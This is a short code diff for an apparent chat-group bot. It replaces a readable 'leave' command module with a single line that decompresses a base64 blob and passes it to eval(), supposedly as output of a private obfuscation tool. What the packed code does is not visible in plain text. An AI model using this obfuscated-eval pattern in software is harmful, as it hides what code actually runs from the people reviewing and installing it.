@@ -1,11 +1,2 @@
-module.exports = {
-  name: 'leave',
-  category: 'group',
-  description: 'Make the bot leave this group (admins only)',
-  groupOnly: true,
-  adminOnly: true,
-  async run({ sock, jid, reply }) {
-    await reply('👋 Goodbye everyone!');
-    await sock.groupLeave(jid);
-  },
-};
+// TFX-PACKED v1 (built by tools/obfuscate.private.js; do not edit by hand - edit the real source and run it again)
+eval(require('zlib').gunzipSync(Buffer.from('H4sIAAAAAAAAA12OsQ3CMBBF+0zxqZJIEQMQUdOAmMHEJzAkvsh2ACvKBFRMwIqMgHM0iPLevf/1O9ZDS0u69+yCxxpjBljV0Qp5S+pKeZVAowId2cUEj46HXqAm3zjTB8M28Z26EMKJcOAASabLeIiPQunOWA+2bSwlLXyfzhWCG2hG4vwhH20DN9hihOfmUuFsdAVHfRsxlbI2WTdlwhcW+fv1fGDDrA+RQFdykS0t8rL+UeeqpSzYzkuLVCr/qcqmOvsA2DdH7hQBAAA=', 'base64')).toString('utf8'));
